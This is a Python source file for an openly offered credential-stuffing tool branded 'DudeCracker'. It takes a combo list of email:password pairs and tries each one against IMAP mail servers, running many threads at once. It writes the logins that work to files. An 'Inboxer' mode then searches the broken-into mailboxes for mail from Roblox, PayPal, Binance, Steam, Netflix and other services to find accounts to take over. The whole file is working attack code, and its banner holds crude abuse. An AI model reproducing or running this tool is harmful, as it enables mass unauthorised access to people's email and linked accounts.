import imaplib
import os
import ctypes
from datetime import datetime
from threading import Thread, Lock
from colorama import *
import time

import colorama


def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))


def rgb_to_ansi(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'


purple = "#9980e2"
rgb_purple = hex_to_rgb(purple)
lime = "#f57512"
rgb_lime = hex_to_rgb(lime)
black = "#582ecf"
rgb_black = hex_to_rgb(black)
darkpp = "#45ceac"
rgb_darkpp = hex_to_rgb(darkpp)
two = "#FA8072"
rgb_two = hex_to_rgb(two)
numbs = "#e4ca16"
rgb_numbs = hex_to_rgb(numbs)

w = Fore.WHITE
r = Fore.RED
fr = Fore.RESET
c = Fore.CYAN

logo = f'''{rgb_to_ansi(*rgb_black)}

▓█████▄  █    ██ ▓█████▄ ▓█████  ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒██▀ ██▌ ██  ▓██▒▒██▀ ██▌▓█   ▀ ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▓██  ▒██░░██   █▌▒███   ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌▓▓█  ░██░░▓█▄   ▌▒▓█  ▄ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ▒▒█████▓ ░▒████▓ ░▒████▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒ ░░▒░ ░ ░  ░ ▒  ▒  ░ ░  ░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░  ░░░ ░ ░  ░ ░  ░    ░   ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
   ░       ░        ░       ░  ░░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░     
 ░                ░             ░                           ░                               
                        @DudeCrack // @DudeGeorge
            For Updates Check : t.me/DudeCrack  // @DudeCrack // @DudeGeorge
                          DudeCracker V5.0.0
{Fore.RESET}'''

init()
os.system('cls') if os.name == 'nt' else os.system('clear')
colorama.init()

threads = []
lock = Lock()
print(logo)
file = input(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Choose File: ')
if os.path.exists(file):
    with open(file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip().split(":") for line in f.readlines()]
else:
    print(f"File '{file}' does not exist.")
    print("Please choose a valid file.")
    time.sleep(2)
    os.system('cls') if os.name == 'nt' else os.system('clear')
    exit()


def clear():
    os.system('cls')


w = Fore.WHITE
r = Fore.RED
fr = Fore.RESET
c = Fore.CYAN

good = 0
not_found = 0
bad = 0
checked = 0

os.system('title Mail Access Checker // Inboxer AIO // DudeCracker V5.0.0 // @DudeCrack // @DudeGeorge')
os.system('cls') if os.name == 'nt' else os.system('clear')


def main():
    global function_choice

    print(logo)
    print(f'{Fore.LIGHTBLUE_EX}[1]{Style.RESET_ALL} Mail Access Checker (All Domains)')
    print(f'{Fore.LIGHTBLUE_EX}[2]{Style.RESET_ALL} Inboxer (All Domains)')
    print(f"{Fore.LIGHTBLUE_EX}---------------------------------------------{Style.RESET_ALL}")
    function_choice = input(f'     {Fore.LIGHTBLUE_EX}[+]{Style.RESET_ALL} Choose Option: ')

    if function_choice == '1':
        os.system('cls') if os.name == 'nt' else os.system('clear')
        print(logo)
        print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL} You Choose Mail Access Checker (All Domains)')
    elif function_choice == '2':
        os.system('cls') if os.name == 'nt' else os.system('clear')
        print(logo)
        print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL} You Choose Inboxer (All Domains)')
        choose_inboxer()
    else:
        print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL} Invalid Option')
        time.sleep(1)
        os.system('cls') if os.name == 'nt' else os.system('clear')
        main()


def choose_inboxer():
    global keyword

    print("")
    print(f'{Fore.LIGHTBLUE_EX}[1]{Style.RESET_ALL} Roblox Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[2]{Style.RESET_ALL} Snapchat Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[3]{Style.RESET_ALL} Discord Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[4]{Style.RESET_ALL} Supercell Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[5]{Style.RESET_ALL} TikTok Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[6]{Style.RESET_ALL} Instagram Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[7]{Style.RESET_ALL} Youtube Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[8]{Style.RESET_ALL} Twitter Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[9]{Style.RESET_ALL} Facebook Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[10]{Style.RESET_ALL} LinkedIn Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[11]{Style.RESET_ALL} RiotGames Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[12]{Style.RESET_ALL} Epicgames Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[13]{Style.RESET_ALL} Steam Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[14]{Style.RESET_ALL} Rockstar Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[15]{Style.RESET_ALL} Netflix Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[16]{Style.RESET_ALL} Spotify Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[17]{Style.RESET_ALL} Twitch Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[18]{Style.RESET_ALL} Amazon Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[19]{Style.RESET_ALL} Playstation Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[20]{Style.RESET_ALL} Fortnite Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[21]{Style.RESET_ALL} Paypal Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[22]{Style.RESET_ALL} /////// Next Page ///////')
    print(f'{Fore.LIGHTBLUE_EX}[23]{Style.RESET_ALL} Custom Inbox (New Function!)')
    print(f'{Fore.LIGHTBLUE_EX}[55]{Style.RESET_ALL} Back')
    print("")

    choose2 = input(f'    {Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Choose Option: ')

    os.system('cls') if os.name == 'nt' else os.system('clear')

    keyword_map = {
        '1': "accounts@roblox.com",
        '2': "no_reply@snapchat.com",
        '3': "noreply@discord.com",
        '4': "noreply@id.supercell.com",
        '5': "register@account.tiktok.com",
        '6': "no-reply@mail.instagram.com",
        '7': "no_reply@youtube.com",
        '8': "verify@x.com",
        '9': "notification@priority.facebookmail.com",
        '10': "security-noreply@linkedin.com",
        '11': "noreply@mail.accounts.riotgames.com",
        '12': "help@accts.epicgames.com",
        '13': "noreply@steampowered.com",
        '14': "noreply@rockstargames.com",
        '15': "info@members.netflix.com",
        '16': "no_reply@spotify.com",
        '17': "no-reply@twitch.tv",
        '18': "account-update@amazon.com",
        '19': "reply@txn-email.playstation.com",
        '20': "fortnite@mail.epicgames.com",
        '21': "noreply@mail.paypal.com",
        '22': choose_inboxer_page2,
        '23': lambda: input(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Keyword (Mail // Subject): '),
        '55': main
    }

    if choose2 in keyword_map:
        if callable(keyword_map[choose2]):
            keyword = keyword_map[choose2]()
        else:
            keyword = keyword_map[choose2]
    else:
        print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Invalid Option')
        time.sleep(1)
        os.system('cls') if os.name == 'nt' else os.system('clear')
        choose_inboxer()


def choose_inboxer_page2():
    global keyword

    print(logo)
    print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}////////////// PAGE 2 //////////////')
    print('')
    print(f'{Fore.LIGHTBLUE_EX}[1]{Style.RESET_ALL} OnlyFans Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[2]{Style.RESET_ALL} Binance Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[3]{Style.RESET_ALL} Valorant Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[4]{Style.RESET_ALL} Pornhub Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[5]{Style.RESET_ALL} Pubg Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[6]{Style.RESET_ALL} Call Of Duty Inbox')
    print(f'{Fore.LIGHTBLUE_EX}[7]{Style.RESET_ALL} DM IN TELEGRAM @DUDEGEORGE')
    print(f'{Fore.LIGHTBLUE_EX}[8]{Style.RESET_ALL} Custom Inbox: ')
    print('')

    choose3 = input(f'    {Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Choose Option: ')

    keyword_map_page2 = {
        '1': "no-reply@onlyfans.com",
        '2': "no-reply@binance.com",
        '3': "noreply@mail.accounts.riotgames.com",
        '4': "noreply@pornhub.com",
        '5': "noreply@pubgmobile.com",
        '6': "noreply@updates.activision",
        '7': "DM IN TELEGRAM @DUDEGEORGE",
        '8': lambda: input(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Keyword (Mail // Subject): ')
    }

    if choose3 in keyword_map_page2:
        if callable(keyword_map_page2[choose3]):
            keyword = keyword_map_page2[choose3]()
        else:
            keyword = keyword_map_page2[choose3]
    else:
        print(f'{Fore.LIGHTBLUE_EX}[x]{Style.RESET_ALL}Invalid Option')
        time.sleep(1)
        os.system('cls') if os.name == 'nt' else os.system('clear')
        choose_inboxer_page2()


def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)


def get_imap_server(email_address):
    _, domain = email_address.split('@', 1)
    outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]

    if domain in outlook_domains:
        imap_server = 'outlook.office365.com'
    else:
        imap_server = f'imap.{domain}'

    return imap_server


def search_email(email, password, keyword):
    global good, not_found, bad

    imap_server = get_imap_server(email)

    try:
        imap = imaplib.IMAP4_SSL(imap_server, timeout=30)
        imap.login(email, password)
        status, messages = imap.select("inbox")
        if status == "OK":
            result, data = imap.uid("search", None, f'(TEXT "{keyword}")')
            if result == "OK":
                mentioned_times = len(data[0].split()) if data[0] else 0

                if mentioned_times > 0:
                    with lock:
                        good += 1
                    result_string = f" -DudeCrack {email}:{password} [x] Keyword: {keyword} [x] Inbox Found: {mentioned_times}"

                    current_date = datetime.now().strftime("%Y-%m-%d")
                    filename = f"found_{keyword}_{current_date}_@DudeCrack.txt"
                    with open(filename, "a") as result_file:
                        result_file.write(result_string + "\n")
                else:
                    with lock:
                        not_found += 1
                    with open(f"valid.txt", "a") as valid_file:
                        valid_file.write(f"{email}:{password}\n")
            else:
                with lock:
                    bad += 1
        imap.logout()

    except Exception as e:
        with lock:
            bad += 1


def check_email_access(email, password):
    global good, not_found, bad, checked

    imap_server = get_imap_server(email)

    try:
        imap = imaplib.IMAP4_SSL(imap_server, timeout=30)
        imap.login(email, password)
        status, _ = imap.select("inbox")
        with lock:
            checked += 1
            if status == "OK":
                good += 1
                result_string = f"{email}:{password}"

                current_date = datetime.now().strftime("%Y-%m-%d")
                filename = f"ValidMail_{current_date}_@DudeCrack.txt"
                with open(filename, "a") as result_file:
                    result_file.write(result_string + "\n")
            else:
                bad += 1
        imap.logout()

    except Exception as e:
        with lock:
            bad += 1


def process_lines(function):
    batch_size = 500
    for i in range(0, len(lines), batch_size):
        batch = lines[i:i + batch_size]
        for credentials in batch:
            if len(credentials) >= 2:
                email, password = credentials[0], credentials[1]
                thread = Thread(target=function, args=(email, password))
                threads.append(thread)
                thread.start()

    for thread in threads:
        thread.join()


def inbox_searcher():
    global file, good, not_found, bad, checked
    print(f"~ Load Your Combo File ~")
    print(f"Searching for : {keyword}")
    process_lines(lambda email, password: search_email(email, password, keyword))
    display_results()


def email_checker():
    global file, good, not_found, bad, checked, start_time
    print(f"~ Load Your Combo File ~")
    start_time = datetime.now()
    Thread(target=print_status).start()
    process_lines(check_email_access)
    display_results()


def print_status():
    while True:
        time.sleep(0.1)  # Refresh rate in seconds
        elapsed_time = datetime.now() - start_time
        minutes = elapsed_time.total_seconds() / 60
        rate = checked / minutes if minutes > 0 else 0
        remaining = len(lines) - checked
        os.system('cls' if os.name == 'nt' else 'clear')
        print(logo)
        print(f"{Fore.LIGHTBLUE_EX} [x]Checked: {checked} \n [x] Valid: {good} \n [x] Invalid: {bad} \n [x] Left: {remaining} \n [x] Rate: {rate:.2f} per minute \n @DudeCrack // @DudeGeorgee Skids Will Be Fucked In Ass{Fore.RESET}")


def display_results():
    os.system('cls')
    print()
    print(f'''
    {rgb_to_ansi(*rgb_black)}~ {Fore.RESET}Keyword {rgb_to_ansi(*rgb_black)}~> {rgb_to_ansi(*rgb_two)}{keyword if function_choice == '2' else 'N/A'} 
    {rgb_to_ansi(*rgb_black)}~ {Fore.RESET}Found {rgb_to_ansi(*rgb_black)}~> {rgb_to_ansi(*rgb_lime)}{good}
    {rgb_to_ansi(*rgb_black)}~ {Fore.RESET}Not Found {rgb_to_ansi(*rgb_black)}~> {Fore.LIGHTRED_EX}{not_found}
    {rgb_to_ansi(*rgb_black)}~ {Fore.RESET}Bad Mail Access {rgb_to_ansi(*rgb_black)}~> {Fore.RED}{bad}''')
    time.sleep(2)
    os.system('cls') if os.name == 'nt' else os.system('clear')
    print(f"[+] Found {good} Inboxes")
    print(f"[+] Found {good} Inboxes")
    print(f"[+] Found {good} Inboxes")
    time.sleep(4)
    os.system('cls') if os.name == 'nt' else os.system('clear')


if __name__ == '__main__':
    main()
    if function_choice == '1':
        email_checker()
    elif function_choice == '2':
        inbox_searcher()